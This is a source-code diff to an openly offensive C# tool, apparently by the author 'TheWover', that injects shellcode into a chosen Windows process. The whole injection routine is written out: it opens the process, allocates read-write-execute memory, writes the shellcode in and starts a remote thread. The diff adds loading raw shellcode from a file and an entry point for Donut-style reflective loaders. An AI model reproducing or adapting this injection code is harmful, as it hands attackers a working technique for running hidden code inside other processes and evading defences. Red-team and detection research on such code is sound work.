@@ -1,6 +1,6 @@
-﻿/*  Author: TheWover
-    Description: Injects embedded base64-encoded shellcode into an arbitrary hardcoded process using native Windows 32 API calls.
-    Last Modified: 11/1/2018
+/*  Author: TheWover
+    Description: Injects shellcode into an arbitrary hardcoded process using native Windows 32 API calls.
+    Last Modified: 03/28/2020
  */
 using System;
 using System.Diagnostics;
@@ -18,9 +18,23 @@ namespace ShellcodeTest
         static void Main(string[] args)
         {
             if (args.Length >= 1)
+            {
                 pid = Convert.ToInt32(args[0]);
 
-            Inject(x86, x64, pid);
+                //If a raw shellcode file was provided as a second argument
+                if (args.Length == 2)
+                {
+                    Console.WriteLine("[+] Reading shellcode from {0}.", args[1]);
+
+                    Inject(System.IO.File.ReadAllBytes(args[1]), pid);
+                }
+                else
+                {
+                    Console.WriteLine("[+] Using embedded shellcode.");
+
+                    Inject(x86, x64, pid);
+                }
+            }
         }
 
         [DllImport("kernel32.dll")]
@@ -55,6 +69,20 @@ namespace ShellcodeTest
         const uint PAGE_READWRITE = 4;
         const uint PAGE_EXECUTE_READWRITE = 0x40;
 
+
+        /// <summary>
+        /// An entry point callable from Donut or other Reflection-based loaders.
+        /// </summary>
+        /// <param name="procPID">The PID of the target process, as a string</param>
+        public static void Run(string procPID)
+        {
+            int pid = Convert.ToInt32(procPID);
+
+            Console.WriteLine("[+] Using embedded shellcode.");
+
+            Inject(x86, x64, pid);
+        }
+
         /// <summary>
         /// Injects shellcode into the target process using CreateRemoteThread, using the correct version for the process's architecture.
         /// </summary>
@@ -69,7 +97,7 @@ namespace ShellcodeTest
             Console.WriteLine(targetProcess.Id);
 
             string s;
-            
+
             if (IsWow64Process(targetProcess) == true)
                 s = x86;
             else
@@ -77,16 +105,31 @@ namespace ShellcodeTest
 
             byte[] shellcode = Convert.FromBase64String(s);
 
-            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
+            if (Inject(shellcode, procPID) != IntPtr.Zero)
+                Console.WriteLine("[!] Successfully injected into {0} ({1})!", targetProcess.ProcessName, procPID);
+            else
+                Console.WriteLine("[!] Failed to inject!");
+
+            return 0;
+        }
+
+        /// <summary>
+        /// Injects raw shellcode into the target process using CreateRemoteThread.
+        /// </summary>
+        /// <param name="shellcode">The shellcode to inject.</param>
+        /// <param name="procPID">The PID of the target process.</param>
+        /// <returns></returns>
+        public static IntPtr Inject(byte[] shellcode, int procPID)
+        {
+            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, procPID);
 
             IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
             UIntPtr bytesWritten;
             WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
 
-            CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
+            return CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
 
-            return 0;
         }
 
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
